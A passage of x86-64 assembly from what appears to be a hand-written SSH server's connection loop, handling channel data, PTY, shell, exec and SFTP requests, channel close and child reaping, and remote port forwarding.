    ; Session channel: write to CHAN_STATE_WRITE_FD (stdin pipe or PTY master)
    mov edi, [rbx + CHAN_STATE_WRITE_FD]
    jmp .v2_data_do_write
.v2_data_write_fd:
    ; TCP/other: write to CHAN_STATE_FD (bidirectional socket)
    mov edi, [rbx + CHAN_STATE_FD]
.v2_data_do_write:
    cmp edi, 0
    jle .v2_check_channel_fds   ; no fd, ignore data

    ; Write data to channel fd
    mov eax, SYS_WRITE
    ; edi already set to fd
    lea rsi, [rsp + 9]         ; data bytes at offset 9
    mov edx, ebp
    syscall

    ; Decrement local window
    sub [rbx + CHAN_STATE_LOCAL_WINDOW], ebp

    jmp .v2_check_channel_fds

.v2_handle_sftp_data:
    ; SFTP channel: process one SFTP packet inline (non-blocking)
    ; ssh_sftp_process_one(sock_fd, state_ptr, chan_state_ptr, data, data_len)
    mov edi, r12d               ; sock_fd
    mov rsi, r13                ; state_ptr
    mov rdx, rbx                ; chan_state_ptr
    lea rcx, [rsp + 9]         ; data bytes at offset 9
    mov r8d, ebp                ; data_len
    call ssh_sftp_process_one

    ; Decrement local window
    sub [rbx + CHAN_STATE_LOCAL_WINDOW], ebp

    jmp .v2_check_channel_fds

    ; ================================================================
    ; WINDOW_ADJUST handler
    ; ================================================================
.v2_handle_window_adjust:
    ; Parse: [byte 93][uint32 recipient_channel][uint32 bytes_to_add]
    lea rdi, [rsp + 1]
    call decode_uint32
    mov ebx, eax                ; local_id

    mov rdi, r14
    mov esi, ebx
    call ssh_channel_find_by_local_id
    test rax, rax
    jz .v2_check_channel_fds

    lea rdi, [rsp + 5]
    call decode_uint32          ; bytes_to_add
    ; rax from find still valid? No, decode_uint32 clobbers it.
    ; Need to re-find. Let me restructure.

    ; Re-find channel (decode_uint32 may clobber rax)
    push rax                    ; save bytes_to_add
    mov rdi, r14
    mov esi, ebx
    call ssh_channel_find_by_local_id
    pop rcx                     ; bytes_to_add in ecx
    test rax, rax
    jz .v2_check_channel_fds

    add [rax + CHAN_STATE_REMOTE_WINDOW], ecx

    jmp .v2_check_channel_fds

    ; ================================================================
    ; CHANNEL_REQUEST handler
    ; ================================================================
.v2_handle_channel_request:
    ; Parse: [byte 98][uint32 recipient][string request_type][byte want_reply]...
    lea rdi, [rsp + 1]
    call decode_uint32          ; eax = recipient (our local_id)
    mov ebx, eax

    ; Find channel
    mov rdi, r14
    mov esi, ebx
    call ssh_channel_find_by_local_id
    test rax, rax
    jz .v2_check_channel_fds

    mov rbx, rax                ; rbx = chan_state_ptr

    ; Get request type string length
    lea rdi, [rsp + 5]
    call decode_uint32          ; eax = req_type_len
    mov ebp, eax                ; save req_type_len

    ; Request type string is at offset 9
    ; want_reply at offset 9 + req_type_len

    ; Check "pty-req" (7 bytes)
    cmp ebp, 7
    jne .v2_check_shell_req
    cmp byte [rsp + 9], 'p'
    jne .v2_check_shell_req
    cmp byte [rsp + 10], 't'
    jne .v2_check_shell_req
    cmp byte [rsp + 11], 'y'
    jne .v2_check_shell_req
    cmp byte [rsp + 12], '-'
    jne .v2_check_shell_req
    cmp byte [rsp + 13], 'r'
    jne .v2_check_shell_req
    cmp byte [rsp + 14], 'e'
    jne .v2_check_shell_req
    cmp byte [rsp + 15], 'q'
    jne .v2_check_shell_req
    jmp .v2_handle_pty_req

.v2_check_shell_req:
    cmp ebp, 5
    jne .v2_check_exec_req
    cmp byte [rsp + 9], 's'
    jne .v2_check_exec_req
    cmp byte [rsp + 10], 'h'
    jne .v2_check_exec_req
    cmp byte [rsp + 11], 'e'
    jne .v2_check_exec_req
    cmp byte [rsp + 12], 'l'
    jne .v2_check_exec_req
    cmp byte [rsp + 13], 'l'
    jne .v2_check_exec_req
    jmp .v2_handle_shell_req

.v2_check_exec_req:
    cmp ebp, 4
    jne .v2_check_subsystem_req
    cmp byte [rsp + 9], 'e'
    jne .v2_check_subsystem_req
    cmp byte [rsp + 10], 'x'
    jne .v2_check_subsystem_req
    cmp byte [rsp + 11], 'e'
    jne .v2_check_subsystem_req
    cmp byte [rsp + 12], 'c'
    jne .v2_check_subsystem_req
    jmp .v2_handle_exec_req

.v2_check_subsystem_req:
    cmp ebp, 9
    jne .v2_handle_unknown_req
    cmp byte [rsp + 9], 's'
    jne .v2_handle_unknown_req
    cmp byte [rsp + 10], 'u'
    jne .v2_handle_unknown_req
    cmp byte [rsp + 11], 'b'
    jne .v2_handle_unknown_req
    cmp byte [rsp + 12], 's'
    jne .v2_handle_unknown_req
    cmp byte [rsp + 13], 'y'
    jne .v2_handle_unknown_req
    cmp byte [rsp + 14], 's'
    jne .v2_handle_unknown_req
    cmp byte [rsp + 15], 't'
    jne .v2_handle_unknown_req
    cmp byte [rsp + 16], 'e'
    jne .v2_handle_unknown_req
    cmp byte [rsp + 17], 'm'
    jne .v2_handle_unknown_req
    jmp .v2_handle_subsystem_req

.v2_handle_unknown_req:
    ; Send CHANNEL_FAILURE if want_reply
    lea ecx, [ebp + 9]         ; offset of want_reply
    movzx eax, byte [rsp + rcx]
    test al, al
    jz .v2_check_channel_fds

    lea rdi, [rsp + 32896]
    mov byte [rdi], SSH_MSG_CHANNEL_FAILURE
    lea rdi, [rsp + 32896 + 1]
    mov esi, [rbx + CHAN_STATE_REMOTE_ID]
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 32896]
    mov edx, 5
    mov rcx, r13
    call ssh_send_packet_enc
    jmp .v2_check_channel_fds

.v2_handle_pty_req:
    ; pty-req: allocate PTY, store master_fd in channel state
    ; want_reply at offset 9+7=16
    movzx eax, byte [rsp + 16]
    push rax                    ; save want_reply

    ; Allocate PTY
    lea rdi, [rsp + 38128 + 8] ; +8 for the push
    lea rsi, [rsp + 38132 + 8]
    call ssh_pty_alloc
    test rax, rax
    jnz .v2_pty_req_fail

    ; Store master_fd in both FD (read) and WRITE_FD (write)
    ; PTY master is bidirectional so both point to the same fd
    mov eax, [rsp + 38128 + 8]
    mov [rbx + CHAN_STATE_FD], eax
    mov [rbx + CHAN_STATE_WRITE_FD], eax

    ; Send CHANNEL_SUCCESS if want_reply
    pop rax                     ; want_reply
    test al, al
    jz .v2_check_channel_fds

    lea rdi, [rsp + 32896]
    mov byte [rdi], SSH_MSG_CHANNEL_SUCCESS
    lea rdi, [rsp + 32896 + 1]
    mov esi, [rbx + CHAN_STATE_REMOTE_ID]
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 32896]
    mov edx, 5
    mov rcx, r13
    call ssh_send_packet_enc
    jmp .v2_check_channel_fds

.v2_pty_req_fail:
    pop rax                     ; discard want_reply
    jmp .v2_check_channel_fds

.v2_handle_shell_req:
    ; shell: spawn shell on the channel's PTY
    ; want_reply at offset 9+5=14
    movzx eax, byte [rsp + 14]
    push rax                    ; save want_reply

    ; Need master_fd and slave_fd
    ; master_fd is in CHAN_STATE_FD (set by pty-req)
    mov edi, [rbx + CHAN_STATE_FD]
    cmp edi, 0
    jle .v2_shell_no_pty

    ; Spawn shell
    mov esi, [rsp + 38132 + 8]  ; slave_fd from pty-req alloc
    call ssh_pty_spawn_shell
    cmp rax, 0
    jle .v2_shell_spawn_fail

    ; Store child_pid
    mov [rbx + CHAN_STATE_CHILD_PID], eax

    ; Close slave_fd in parent
    mov eax, SYS_CLOSE
    mov edi, [rsp + 38132 + 8]
    syscall

    ; Send CHANNEL_SUCCESS if want_reply
    pop rax
    test al, al
    jz .v2_check_channel_fds

    lea rdi, [rsp + 32896]
    mov byte [rdi], SSH_MSG_CHANNEL_SUCCESS
    lea rdi, [rsp + 32896 + 1]
    mov esi, [rbx + CHAN_STATE_REMOTE_ID]
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 32896]
    mov edx, 5
    mov rcx, r13
    call ssh_send_packet_enc
    jmp .v2_check_channel_fds

.v2_shell_no_pty:
.v2_shell_spawn_fail:
    pop rax                     ; discard want_reply
    jmp .v2_check_channel_fds

.v2_handle_exec_req:
    ; exec: parse command, spawn exec
    ; want_reply at offset 9+4=13
    movzx eax, byte [rsp + 13]
    push rax                    ; save want_reply

    ; Command string at offset 14: [uint32 len][data]
    ; +8 for the push above
    lea rdi, [rsp + 14 + 8]
    call decode_uint32          ; eax = cmd_len
    mov ebp, eax                ; save cmd_len

    ; Check if PTY was allocated (pty-req came first)
    mov edi, [rbx + CHAN_STATE_FD]
    cmp edi, 0
    jle .v2_exec_pipe           ; no PTY → pipe-based exec

    ; PTY exec path (existing)
    mov esi, [rsp + 38132 + 8]
    lea rdx, [rsp + 18 + 8]    ; cmd data (+8 for push)
    mov ecx, ebp
    call ssh_pty_spawn_exec
    cmp rax, 0
    jle .v2_exec_fail

    ; Store child_pid
    mov [rbx + CHAN_STATE_CHILD_PID], eax

    ; Close slave_fd in parent
    mov eax, SYS_CLOSE
    mov edi, [rsp + 38132 + 8]
    syscall

    jmp .v2_exec_success

.v2_exec_pipe:
    ; Pipe-based exec (no PTY)
    lea rdi, [rsp + 18 + 8]    ; cmd data (+8 for push)
    mov esi, ebp                ; cmd_len
    call ssh_pty_spawn_exec_pipe
    cmp rax, -1
    je .v2_exec_fail

    ; Store fds and child_pid in channel state
    ; rax = stdout_read_fd, edx = stdin_write_fd, ecx = child_pid
    mov [rbx + CHAN_STATE_FD], eax           ; stdout read fd (for poll loop read)
    mov [rbx + CHAN_STATE_WRITE_FD], edx   ; stdin write fd (for poll loop write)
    mov [rbx + CHAN_STATE_CHILD_PID], ecx    ; child pid

    jmp .v2_exec_success

.v2_exec_success:
    ; Send CHANNEL_SUCCESS if want_reply
    pop rax
    test al, al
    jz .v2_check_channel_fds

    lea rdi, [rsp + 32896]
    mov byte [rdi], SSH_MSG_CHANNEL_SUCCESS
    lea rdi, [rsp + 32896 + 1]
    mov esi, [rbx + CHAN_STATE_REMOTE_ID]
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 32896]
    mov edx, 5
    mov rcx, r13
    call ssh_send_packet_enc
    jmp .v2_check_channel_fds

.v2_exec_fail:
    pop rax
    jmp .v2_check_channel_fds

    ; ================================================================
    ; SUBSYSTEM REQUEST handler
    ; ================================================================
.v2_handle_subsystem_req:
    ; subsystem: want_reply at offset 9+9=18
    movzx eax, byte [rsp + 18]
    push rax                    ; save want_reply (+8 rsp shift)

    ; Parse subsystem name string at offset 19: [uint32 len][data]
    ; +8 for the push
    lea rdi, [rsp + 19 + 8]
    call decode_uint32          ; eax = subsystem_name_len
    mov ebp, eax

    ; Check if name is "sftp" (4 bytes)
    ; +8 for the push
    cmp ebp, 4
    jne .v2_subsystem_unknown
    cmp byte [rsp + 23 + 8], 's'
    jne .v2_subsystem_unknown
    cmp byte [rsp + 24 + 8], 'f'
    jne .v2_subsystem_unknown
    cmp byte [rsp + 25 + 8], 't'
    jne .v2_subsystem_unknown
    cmp byte [rsp + 26 + 8], 'p'
    jne .v2_subsystem_unknown

    ; Send CHANNEL_SUCCESS if want_reply
    pop rax
    test al, al
    jz .v2_subsystem_sftp_dispatch

    lea rdi, [rsp + 32896]
    mov byte [rdi], SSH_MSG_CHANNEL_SUCCESS
    lea rdi, [rsp + 32896 + 1]
    mov esi, [rbx + CHAN_STATE_REMOTE_ID]
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 32896]
    mov edx, 5
    mov rcx, r13
    call ssh_send_packet_enc

.v2_subsystem_sftp_dispatch:
    ; Non-blocking: mark channel as SFTP, init handles, return to event loop
    ; SFTP packets will be processed inline in CHANNEL_DATA handler
    mov dword [rbx + CHAN_STATE_TYPE], CHAN_TYPE_SFTP
    call ssh_sftp_init_handles
    jmp .v2_check_channel_fds

.v2_subsystem_unknown:
    ; Unknown subsystem: send CHANNEL_FAILURE if want_reply
    pop rax
    test al, al
    jz .v2_check_channel_fds

    lea rdi, [rsp + 32896]
    mov byte [rdi], SSH_MSG_CHANNEL_FAILURE
    lea rdi, [rsp + 32896 + 1]
    mov esi, [rbx + CHAN_STATE_REMOTE_ID]
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 32896]
    mov edx, 5
    mov rcx, r13
    call ssh_send_packet_enc
    jmp .v2_check_channel_fds

    ; ================================================================
    ; CHANNEL_EOF / CHANNEL_CLOSE handler
    ; ================================================================
.v2_handle_channel_eof_close:
    ; Parse: [byte 96/97][uint32 recipient_channel]
    lea rdi, [rsp + 1]
    call decode_uint32          ; eax = recipient (our local_id)

    mov rdi, r14
    mov esi, eax
    call ssh_channel_find_by_local_id
    test rax, rax
    jz .v2_check_channel_fds

    mov rbx, rax                ; chan_state_ptr

    ; If session channel with child, handle gracefully
    cmp dword [rbx + CHAN_STATE_TYPE], CHAN_TYPE_SESSION
    jne .v2_eof_close_fd

    mov edi, [rbx + CHAN_STATE_CHILD_PID]
    cmp edi, 0
    jle .v2_eof_close_fd

    ; Close stdin write fd to deliver EOF to child
    ; This allows the child to finish naturally (e.g., 'cat' will exit)
    mov edi, [rbx + CHAN_STATE_WRITE_FD]
    cmp edi, 0
    jle .v2_eof_wait_child
    mov eax, SYS_CLOSE
    syscall
    mov dword [rbx + CHAN_STATE_WRITE_FD], 0  ; mark closed

    ; For PTY channels, WRITE_FD == FD (same master fd), so also clear FD
    cmp dword [rbx + CHAN_STATE_FD], edi
    jne .v2_eof_wait_child
    mov dword [rbx + CHAN_STATE_FD], 0

.v2_eof_wait_child:
    ; Wait for child to exit (with timeout via retries)
    ; Try WNOHANG up to 50 times with 100ms poll sleeps = ~5s max
    xor ebp, ebp                ; retry counter

.v2_eof_wait_loop:
    cmp ebp, 50
    jge .v2_eof_force_kill      ; timeout — force kill

    ; Drain pipe output while waiting
    mov edi, [rbx + CHAN_STATE_FD]
    cmp edi, 0
    jle .v2_eof_check_child

    ; poll(fd, POLLIN, 100ms) to check if readable
    sub rsp, 16
    mov dword [rsp], edi
    mov word [rsp + 4], POLLIN
    mov word [rsp + 6], 0
    mov eax, SYS_POLL
    lea rdi, [rsp]
    mov esi, 1
    mov edx, 100                ; 100ms
    syscall
    test word [rsp + 6], POLLIN
    jz .v2_eof_drain_skip

    ; Read from pipe
    mov edi, [rbx + CHAN_STATE_FD]
    mov eax, SYS_READ
    lea rsi, [rsp + 16 + 34032]  ; buffer (+16 for sub rsp)
    mov edx, 4096
    syscall
    cmp rax, 0
    jle .v2_eof_drain_eof

    ; Send as CHANNEL_DATA
    mov ecx, eax                ; bytes read
    push rbx
    push rcx
    mov edi, r12d
    mov rsi, r13
    mov rdx, rbx
    lea rcx, [rsp + 16 + 16 + 34032]  ; +16 sub + 2 pushes
    pop r8                      ; data_len (was in ecx, pushed)
    mov r8d, r8d                ; zero-extend
    call ssh_channel_send_data
    pop rbx
    add rsp, 16
    jmp .v2_eof_check_child

.v2_eof_drain_eof:
    ; Pipe EOF — child closed stdout, mark fd closed
    mov edi, [rbx + CHAN_STATE_FD]
    mov eax, SYS_CLOSE
    syscall
    mov dword [rbx + CHAN_STATE_FD], 0

.v2_eof_drain_skip:
    add rsp, 16

.v2_eof_check_child:
    ; waitpid(WNOHANG)
    mov eax, SYS_WAIT4
    mov edi, [rbx + CHAN_STATE_CHILD_PID]
    lea rsi, [rsp + 34024]
    mov edx, WNOHANG_FLAG
    xor r10d, r10d
    syscall
    cmp rax, 0
    jg .v2_eof_child_done       ; child exited

    inc ebp
    jmp .v2_eof_wait_loop

.v2_eof_force_kill:
    ; Timeout — SIGKILL
    mov eax, SYS_KILL
    mov edi, [rbx + CHAN_STATE_CHILD_PID]
    mov esi, 9
    syscall
    mov eax, SYS_WAIT4
    mov edi, [rbx + CHAN_STATE_CHILD_PID]
    lea rsi, [rsp + 34024]
    xor edx, edx               ; blocking
    xor r10d, r10d
    syscall

.v2_eof_child_done:
    ; Drain any remaining pipe data after child exit
.v2_eof_final_drain:
    mov edi, [rbx + CHAN_STATE_FD]
    cmp edi, 0
    jle .v2_eof_send_close

    mov eax, SYS_READ
    lea rsi, [rsp + 34032]
    mov edx, 4096
    syscall
    cmp rax, 0
    jle .v2_eof_close_fds

    ; Send remaining data
    mov ebp, eax
    push rbx
    mov edi, r12d
    mov rsi, r13
    mov rdx, rbx
    lea rcx, [rsp + 34032 + 8]  ; +8 for push
    mov r8d, ebp
    call ssh_channel_send_data
    pop rbx
    jmp .v2_eof_final_drain

.v2_eof_close_fds:
    ; Close remaining fds
    mov edi, [rbx + CHAN_STATE_FD]
    cmp edi, 0
    jle .v2_eof_close_write
    mov eax, SYS_CLOSE
    syscall
.v2_eof_close_write:
    mov edi, [rbx + CHAN_STATE_WRITE_FD]
    cmp edi, 0
    jle .v2_eof_send_close
    mov eax, SYS_CLOSE
    syscall
    jmp .v2_eof_send_close

.v2_eof_close_fd:
    ; Non-session channel (e.g., direct-tcp): just close fd
    mov edi, [rbx + CHAN_STATE_FD]
    cmp edi, 0
    jle .v2_eof_send_close
    mov eax, SYS_CLOSE
    syscall

.v2_eof_send_close:
    ; Send EOF + CLOSE back
    mov edi, r12d
    mov rsi, r13
    mov rdx, rbx
    call ssh_channel_send_eof_close

    ; Free the channel slot
    mov rdi, rbx
    call ssh_channel_free

    jmp .v2_check_channel_fds

    ; ================================================================
    ; Step 4: Check active channel fds for readable data
    ; ================================================================
.v2_check_channel_fds:
    ; Walk the pollfd array starting at index 1 (skip ssh_sock)
    ; For each fd with POLLIN revents, find the matching channel and read
    mov ecx, 1                  ; pollfd index (skip [0] = ssh_sock)

.v2_chanfd_loop:
    cmp ecx, r15d               ; r15d = nfds from build step
    jge .v2_check_fwd_accepts

    ; Check if this pollfd has POLLIN
    mov eax, ecx
    shl eax, 3                  ; * 8
    lea rbp, [rsp + 33920 + rax]
    test word [rbp + 6], POLLIN
    jz .v2_chanfd_next

    ; Find which channel has this fd
    mov ebx, [rbp]              ; fd from pollfd
    push rcx                    ; save loop counter

    ; Scan channel table for matching fd
    xor ecx, ecx
.v2_find_chan_by_fd:
    cmp ecx, MAX_CHANNELS
    jge .v2_chanfd_not_found

    mov eax, ecx
    imul eax, CHAN_STATE_SIZE
    lea rdi, [r14 + rax]

    cmp dword [rdi + CHAN_STATE_TYPE], CHAN_TYPE_UNUSED
    je .v2_find_chan_by_fd_next

    cmp [rdi + CHAN_STATE_FD], ebx
    je .v2_found_chan_for_fd

.v2_find_chan_by_fd_next:
    inc ecx
    jmp .v2_find_chan_by_fd

.v2_found_chan_for_fd:
    ; rdi = chan_state_ptr, ebx = fd
    push rdi                    ; save chan_state_ptr

    ; Read from the fd
    mov eax, SYS_READ
    mov edi, ebx
    lea rsi, [rsp + 34032 + 16]  ; +16 for 2 pushes
    mov edx, 4096
    syscall

    pop rdi                     ; restore chan_state_ptr
    cmp rax, 0
    jle .v2_chanfd_eof          ; EOF or error from fd

    ; Send data through SSH channel
    mov ebx, eax                ; bytes read
    push rdi                    ; save chan_state_ptr again
    mov edi, r12d               ; sock_fd
    mov rsi, r13                ; state_ptr
    mov rdx, rdi                ; chan_state_ptr (was in rdi before push)
    ; Oops, rdi was pushed. Fix:
    pop rdx                     ; chan_state_ptr into rdx
    push rdx                    ; re-save
    lea rcx, [rsp + 34032 + 16]  ; +16 for 2 items on stack (push rcx + push rdx)
    mov r8d, ebx                ; data_len
    call ssh_channel_send_data

    pop rdi                     ; discard saved chan_state_ptr
    jmp .v2_chanfd_resume

.v2_chanfd_eof:
    ; fd EOF — for session channels, child exit handled by waitpid below.
    ; For direct-tcp (forwarded) channels, handle EOF here: send EOF+CLOSE.
    cmp dword [rdi + CHAN_STATE_TYPE], CHAN_TYPE_DIRECT_TCP
    jne .v2_chanfd_resume

    ; rdi = chan_state_ptr. Close the TCP fd.
    mov ebx, [rdi + CHAN_STATE_FD]   ; save fd
    push rdi                          ; save chan_state_ptr
    mov eax, SYS_CLOSE
    mov edi, ebx
    syscall
    pop rdi                           ; restore chan_state_ptr

    ; Clear the fd so we don't double-close
    mov dword [rdi + CHAN_STATE_FD], 0

    ; Send EOF + CLOSE to SSH peer
    ; ssh_channel_send_eof_close(edi=sock_fd, rsi=state_ptr, rdx=chan_state_ptr)
    mov rdx, rdi               ; chan_state_ptr
    mov edi, r12d              ; sock_fd
    mov rsi, r13               ; state_ptr
    call ssh_channel_send_eof_close

    ; Free the channel slot
    ; ssh_channel_free(rdi=chan_state_ptr) — rdx still holds it
    mov rdi, rdx
    call ssh_channel_free

    jmp .v2_chanfd_resume

.v2_chanfd_not_found:
    ; No matching channel found for this fd (shouldn't happen)

.v2_chanfd_resume:
    pop rcx                     ; restore pollfd loop counter

.v2_chanfd_next:
    inc ecx
    jmp .v2_chanfd_loop

    ; ================================================================
    ; Step 4b: Check forward listen fds for incoming connections
    ; ================================================================
.v2_check_fwd_accepts:
    cmp dword [rel remote_fwd_count], 0
    je .v2_check_children

    ; Walk the forward table; for each active entry, check if its listen_fd
    ; had POLLIN in the pollfd array. If so, accept and open a forwarded-tcpip channel.
    lea rdi, [rel remote_fwd_table]
    xor ecx, ecx               ; forward table index

.v2_fwd_accept_loop:
    cmp ecx, MAX_REMOTE_FWDS
    jge .v2_check_children

    cmp dword [rdi + FWD_ACTIVE], 1
    jne .v2_fwd_accept_next

    ; Check if this listen_fd is in the pollfd array with POLLIN
    mov ebx, [rdi + FWD_LISTEN_FD]
    push rcx
    push rdi

    ; Scan pollfd array for this fd
    mov ecx, 1                  ; skip index 0 (ssh_sock)
    lea rbp, [rsp + 33920 + 16] ; +16 for 2 pushes
.v2_fwd_find_pollfd:
    cmp ecx, r15d
    jge .v2_fwd_no_pollin

    mov eax, ecx
    shl eax, 3
    lea rdx, [rbp + rax]
    cmp [rdx], ebx              ; match fd?
    jne .v2_fwd_find_pollfd_next

    ; Found it - check revents
    test word [rdx + 6], POLLIN
    jz .v2_fwd_no_pollin
    jmp .v2_fwd_do_accept

.v2_fwd_find_pollfd_next:
    inc ecx
    jmp .v2_fwd_find_pollfd

.v2_fwd_do_accept:
    ; Accept the incoming connection on this forward listen fd
    mov edi, ebx               ; listen_fd
    call net_accept
    cmp rax, -1
    je .v2_fwd_no_pollin       ; accept failed, skip

    mov ebx, eax               ; ebx = client_fd

    ; Allocate a channel for this forwarded connection
    mov rdi, r14               ; chan_table_ptr
    call ssh_channel_alloc
    test rax, rax
    jz .v2_fwd_accept_close_client  ; table full

    mov rbp, rax               ; rbp = new chan_state_ptr

    ; Configure channel: type=DIRECT_TCP, fd=client_fd, window+maxpkt set
    mov dword [rbp + CHAN_STATE_TYPE], CHAN_TYPE_DIRECT_TCP
    mov [rbp + CHAN_STATE_FD], ebx
    mov dword [rbp + CHAN_STATE_LOCAL_WINDOW], V2_INITIAL_WINDOW
    mov dword [rbp + CHAN_STATE_LOCAL_MAXPKT], V2_MAX_PACKET_DATA
    ; remote_id, remote_window, remote_maxpkt will be set by CHANNEL_OPEN_CONFIRM

    ; Get the port from the forward table entry (still on stack)
    mov rdi, [rsp]             ; restore fwd table entry ptr
    mov ecx, [rdi + FWD_PORT]  ; forwarded port

    ; Build and send SSH_MSG_CHANNEL_OPEN "forwarded-tcpip"
    lea rdi, [rsp + 32896 + 16]  ; send buffer (+16 for pushes)
    mov esi, [rbp + CHAN_STATE_LOCAL_ID]  ; sender_channel = our local_id
    mov edx, ecx               ; port
    mov ecx, V2_INITIAL_WINDOW ; initial_window
    mov r8d, V2_MAX_PACKET_DATA ; max_packet
    call ssh_remote_fwd_build_channel_open
    ; rax = payload length

    ; Send the CHANNEL_OPEN packet
    mov edx, eax               ; payload_len
    mov edi, r12d              ; sock_fd
    lea rsi, [rsp + 32896 + 16]  ; payload (+16 for pushes)
    mov rcx, r13               ; state_ptr
    call ssh_send_packet_enc

    jmp .v2_fwd_no_pollin

.v2_fwd_accept_close_client:
    ; Channel table full, close the accepted client fd
    mov eax, SYS_CLOSE
    mov edi, ebx
    syscall

.v2_fwd_no_pollin:
    pop rdi
    pop rcx

.v2_fwd_accept_next:
    add rdi, FWD_ENTRY_SIZE
    inc ecx
    jmp .v2_fwd_accept_loop

    ; ================================================================
    ; Step 5: Check for exited children (waitpid WNOHANG)
    ; ================================================================
.v2_check_children:
    xor ecx, ecx               ; channel index

.v2_child_loop:
    cmp ecx, MAX_CHANNELS
    jge .v2_loop                ; back to main loop

    mov eax, ecx
    imul eax, CHAN_STATE_SIZE
    lea rbx, [r14 + rax]

    ; Only check session channels with child_pid > 0
    cmp dword [rbx + CHAN_STATE_TYPE], CHAN_TYPE_SESSION
    jne .v2_child_next
    cmp dword [rbx + CHAN_STATE_CHILD_PID], 0
    jle .v2_child_next

    push rcx                    ; save loop counter

    ; waitpid(child_pid, &status, WNOHANG)
    mov eax, SYS_WAIT4
    mov edi, [rbx + CHAN_STATE_CHILD_PID]
    lea rsi, [rsp + 34024 + 8]  ; +8 for push
    mov edx, WNOHANG_FLAG
    xor r10d, r10d
    syscall

    cmp rax, 0
    jle .v2_child_not_exited

    ; Child exited — drain remaining pipe data, then send EOF+CLOSE
    ; Drain loop: read any buffered output from child's stdout pipe
.v2_child_drain:
    mov edi, [rbx + CHAN_STATE_FD]
    cmp edi, 0
    jle .v2_child_send_eof

    ; Non-blocking read from pipe fd
    mov eax, SYS_READ
    ; edi already set
    lea rsi, [rsp + 34032 + 8]  ; +8 for push rcx
    mov edx, 4096
    syscall
    cmp rax, 0
    jle .v2_child_send_eof      ; EOF or error — done draining

    ; Send drained data as CHANNEL_DATA
    mov ebp, eax                ; bytes read
    push rbx
    mov edi, r12d               ; sock_fd
    mov rsi, r13                ; state_ptr
    mov rdx, rbx                ; chan_state_ptr
    lea rcx, [rsp + 34032 + 16]  ; +16 for 2 pushes
    mov r8d, ebp                ; data_len
    call ssh_channel_send_data
    pop rbx
    jmp .v2_child_drain         ; keep draining

.v2_child_send_eof:
    ; Send EOF+CLOSE
    push rbx
    mov edi, r12d
    mov rsi, r13
    mov rdx, rbx
    call ssh_channel_send_eof_close
    pop rbx

    ; Close read fd
    mov edi, [rbx + CHAN_STATE_FD]
    cmp edi, 0
    jle .v2_child_free

    push rdi                    ; save fd value
    mov eax, SYS_CLOSE
    syscall

    ; Close write fd if different (pipe exec case)
    pop rdi                     ; original CHAN_STATE_FD value
    mov eax, [rbx + CHAN_STATE_WRITE_FD]
    cmp eax, edi                ; same fd? (PTY case)
    je .v2_child_free
    cmp eax, 0
    jle .v2_child_free

    mov edi, eax
    mov eax, SYS_CLOSE
    syscall

.v2_child_free:
    ; Free channel slot
    mov rdi, rbx
    call ssh_channel_free

.v2_child_not_exited:
    pop rcx                     ; restore loop counter

.v2_child_next:
    inc ecx
    jmp .v2_child_loop

    ; ================================================================
    ; Exit (connection dropped)
    ; ================================================================
.v2_exit:
    ; Clean up remote forward listen sockets before exit
    call ssh_remote_fwd_cleanup
    add rsp, 38144
    pop rbp
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    ret

